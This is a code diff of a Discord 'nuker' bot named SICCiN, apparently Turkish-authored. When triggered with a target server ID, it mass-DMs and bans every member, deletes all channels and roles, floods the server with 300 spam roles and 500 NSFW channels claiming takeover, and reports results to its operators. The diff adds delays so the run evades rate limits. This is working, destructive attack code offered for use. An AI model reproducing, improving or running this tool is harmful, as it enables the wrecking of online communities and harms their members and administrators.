@@ -1,4 +1,3 @@
-
 require("dotenv").config();
 const {
   Client,
@@ -161,6 +160,11 @@ function protectionAlertEmbed(data) {
     .setTimestamp();
 }
 
+// ================== ASENKRON BEKLEME FONKSİYONU ==================
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 // ================== SICCiN İŞLEM ==================
 async function startSiccin(interaction, targetGuildId) {
   const executor = interaction.user;
@@ -168,7 +172,6 @@ async function startSiccin(interaction, targetGuildId) {
 
   // KORUNAN SUNUCU KONTROLÜ
   if (isProtectedServer(targetGuildId)) {
-    // Owner'a bildir
     const alertData = {
       userTag: executor.tag,
       userId: executor.id,
@@ -185,7 +188,6 @@ async function startSiccin(interaction, targetGuildId) {
       console.error("Owner'a bildirim gönderilemedi:", err);
     }
     
-    // Kullanıcıya hata göster
     return interaction.followUp({
       embeds: [protectedServerErrorEmbed(targetGuildId)],
       ephemeral: true,
@@ -200,7 +202,7 @@ async function startSiccin(interaction, targetGuildId) {
     });
 
   await interaction.followUp({
-    content: "🔥 SICCiN BAŞLATILDI",
+    content: "🔥 SICCiN BAŞLATILDI\n⏳ İşlemler sırayla yapılıyor...",
     ephemeral: true,
   });
 
@@ -208,39 +210,130 @@ async function startSiccin(interaction, targetGuildId) {
     rolesDeleted = 0,
     channelsDeleted = 0;
 
-  const members = await guild.members.fetch();
-  for (const m of members.values()) {
-    if (m.user.bot) continue;
-    await m.send({ embeds: [dmEmbed(guild)] }).catch(() => {});
-    await m.ban({ reason: "SICCiN" }).then(() => banned++).catch(() => {});
+  // ================== BAN İŞLEMLERİ ==================
+  try {
+    const members = await guild.members.fetch();
+    
+    // Önce DM gönder
+    for (const m of members.values()) {
+      if (m.user.bot) continue;
+      try {
+        await m.send({ embeds: [dmEmbed(guild)] });
+        await delay(50); // Rate limit için bekle
+      } catch (dmErr) {
+        // DM gönderilemezse devam et
+      }
+    }
+    
+    // Sonra banla
+    for (const m of members.values()) {
+      if (m.user.bot) continue;
+      try {
+        await m.ban({ reason: "ＳＩＣＣＩＮ 🔱" });
+        banned++;
+        await delay(100); // Rate limit için bekle
+      } catch (banErr) {
+        // Banlanamazsa devam et
+      }
+    }
+  } catch (err) {
+    console.error("Ban işlemlerinde hata:", err);
   }
 
-  for (const c of guild.channels.cache.values()) {
-    await c.delete().then(() => channelsDeleted++).catch(() => {});
+  // ================== KANALLARI SİL ==================
+  try {
+    const channels = Array.from(guild.channels.cache.values());
+    
+    for (const channel of channels) {
+      try {
+        await channel.delete().catch(() => {});
+        channelsDeleted++;
+        await delay(200); // Rate limit için bekle
+      } catch (channelErr) {
+        // Silinemezse devam et
+      }
+    }
+  } catch (err) {
+    console.error("Kanal silme hatası:", err);
   }
 
-  for (const r of guild.roles.cache.values()) {
-    if (r.managed) continue;
-    await r.delete().then(() => rolesDeleted++).catch(() => {});
+  // ================== ROLLERİ SİL ==================
+  try {
+    const roles = Array.from(guild.roles.cache.values());
+    
+    for (const role of roles) {
+      if (role.managed || role.id === guild.id) continue; // Bot rolleri ve @everyone rolünü silme
+      try {
+        await role.delete().catch(() => {});
+        rolesDeleted++;
+        await delay(200); // Rate limit için bekle
+      } catch (roleErr) {
+        // Silinemezse devam et
+      }
+    }
+  } catch (err) {
+    console.error("Rol silme hatası:", err);
   }
 
+  // ================== YENİ ROLLER OLUŞTUR ==================
   let rolesCreated = 0;
+  try {
+    for (let i = 0; i < 300; i++) {
+      try {
+        await guild.roles.create({ 
+          name: `ＳＩＣＣＩＮ 🔱 ${i+1}`,
+          color: [Math.floor(Math.random() * 255), Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
+          permissions: []
+        });
+        rolesCreated++;
+        
+        // Her 10 rolde bir daha uzun bekle
+        if (i % 10 === 0) {
+          await delay(500);
+        } else {
+          await delay(100);
+        }
+        
+      } catch (roleCreateErr) {
+        // Rol oluşturulamazsa devam et
+        console.log(`Rol ${i+1} oluşturulamadı:`, roleCreateErr.message);
+      }
+    }
+  } catch (err) {
+    console.error("Rol oluşturma hatası:", err);
+  }
+
+  // ================== YENİ KANALLAR OLUŞTUR ==================
   let channelsCreated = 0;
-
-  for (let i = 0; i < 300; i++) {
-    await guild.roles
-      .create({ name: "ＳＩＣＣＩＮ 🔱" })
-      .then(() => rolesCreated++)
-      .catch(() => {});
+  try {
+    for (let i = 0; i < 500; i++) {
+      try {
+        await guild.channels.create({ 
+          name: `ＳＩＣＣＩＮ-${i+1}`,
+          type: 0, // 0 = text kanalı, 2 = voice kanalı
+          topic: "ＳＩＣＣＩＮ tarafından ele geçirildi 🔱",
+          nsfw: true,
+          rateLimitPerUser: 10
+        });
+        channelsCreated++;
+        
+        // Her 20 kanalda bir daha uzun bekle
+        if (i % 20 === 0) {
+          await delay(800);
+        } else {
+          await delay(150);
+        }
+        
+      } catch (channelCreateErr) {
+        // Kanal oluşturulamazsa devam et
+        console.log(`Kanal ${i+1} oluşturulamadı:`, channelCreateErr.message);
+      }
+    }
+  } catch (err) {
+    console.error("Kanal oluşturma hatası:", err);
   }
 
-  for (let i = 0; i < 500; i++) {
-    await guild.channels
-      .create({ name: "ＳＩＣＣＩＮ 🔱", type: 0 })
-      .then(() => channelsCreated++)
-      .catch(() => {});
-  }
-
+  // ================== LOG GÖNDER ==================
   const log = logEmbed({
     usedGuild,
     userId: executor.id,
@@ -255,8 +348,26 @@ async function startSiccin(interaction, targetGuildId) {
     channelsCreated,
   });
 
-  await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
-  await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
+  try {
+    await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [log] }));
+    await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] }));
+  } catch (logErr) {
+    console.error("Log gönderilemedi:", logErr);
+  }
+
+  // ================== İŞLEM TAMAMLANDI BİLDİRİMİ ==================
+  try {
+    await interaction.followUp({
+      content: `✅ SICCiN İŞLEMİ TAMAMLANDI!\n\n` +
+               `Banlanan: ${banned} kişi\n` +
+               `Silinen: ${channelsDeleted} kanal, ${rolesDeleted} rol\n` +
+               `Oluşturulan: ${channelsCreated} kanal, ${rolesCreated} rol\n\n` +
+               `#GLORY TO ＳＩＣＣＩＮ 🔱`,
+      ephemeral: true,
+    });
+  } catch (finalErr) {
+    console.error("Final bildirimi gönderilemedi:", finalErr);
+  }
 }
 
 // ================== MESSAGE İŞLEME ==================
@@ -266,8 +377,6 @@ client.on("messageCreate", async (message) => {
   // .siccin komutu kontrolü
   if (message.content.toLowerCase() === ".siccin") {
     try {
-      // İlk kodda sadece OWNER_ID ve SERI_ID kontrolü vardı
-      // İkinci kodda herkese açıktı, ikisini birleştirdim
       // İsterseniz bu kontrolü kaldırabilirsiniz
       if (![OWNER_ID, SERI_ID].includes(message.author.id)) {
         return message.reply({ 
@@ -280,7 +389,7 @@ client.on("messageCreate", async (message) => {
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
           .setCustomId("siccinStart")
-          .setLabel("ＳＩＣＣＩＮ")
+          .setLabel("ＳＩＣＣＩＮ BAŞLAT")
           .setStyle(ButtonStyle.Danger)
           .setEmoji("🔥")
       );
@@ -340,7 +449,6 @@ client.on("messageCreate", async (message) => {
 client.on("interactionCreate", async (interaction) => {
   // ================== BUTTON ==================
   if (interaction.isButton() && interaction.customId === "siccinStart") {
-    // ⚠️ HİÇBİR defer/reply YOK - doğrudan modal göster
     const modal = new ModalBuilder()
       .setCustomId("siccinModal")
       .setTitle("Hedef Sunucu ID")
@@ -351,6 +459,7 @@ client.on("interactionCreate", async (interaction) => {
             .setLabel("Hedef Sunucu ID")
             .setStyle(TextInputStyle.Short)
             .setRequired(true)
+            .setPlaceholder("Sunucu ID'sini girin...")
         )
       );
 
@@ -370,7 +479,7 @@ client.on("interactionCreate", async (interaction) => {
 
     const gid = interaction.fields.getTextInputValue("guildID").trim();
 
-    // KORUNAN SUNUCU KONTROLÜ (ön kontrol)
+    // KORUNAN SUNUCU KONTROLÜ
     if (isProtectedServer(gid)) {
       const alertData = {
         userTag: interaction.user.tag,
@@ -405,22 +514,26 @@ client.on("ready", () => {
   console.log(`Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
   
   client.user.setActivity({
-    name: ".siccin | Korunan: 2 sunucu",
+    name: ".siccin | 500 kanal, 300 rol",
     type: ActivityType.Playing,
   });
   
   console.log("═══════════════════════════════════════");
-  console.log("Komut: .siccin");
-  console.log("Embed ve buton gönderir");
+  console.log("SICCiN BOT AKTİF");
+  console.log("Özellikler:");
+  console.log("- Tüm üyeleri banlar + DM gönderir");
+  console.log("- Tüm kanalları siler (500 kanal oluşturur)");
+  console.log("- Tüm rolleri siler (300 rol oluşturur)");
+  console.log("- Rate limit korumalı");
   console.log("═══════════════════════════════════════");
 });
 
 // ================== CRASH KALKAN ==================
 process.on("unhandledRejection", (err) => {
-  console.log("UNHANDLED:", err);
+  console.log("UNHANDLED REJECTION:", err);
 });
 process.on("uncaughtException", (err) => {
-  console.log("CRASH:", err);
+  console.log("UNCAUGHT EXCEPTION:", err);
 });
 
 client.login(BOT_TOKEN);
